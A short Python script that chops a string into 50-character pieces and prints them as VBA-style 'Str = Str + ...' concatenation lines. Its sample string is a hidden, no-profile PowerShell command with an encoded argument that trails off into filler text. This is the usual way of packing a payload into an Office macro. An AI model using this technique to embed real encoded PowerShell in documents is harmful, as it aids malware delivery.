#!/usr/bin/python3.7

#A simple python script to split a string
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3ACadhoasdfasdoffhfoahfaosfhaohfasoifhasoihaosidfah"
n = 50
for i in range(0, len(str), n):
    print ("Str = Str + " + '"' + str[i:i+n] + '"')
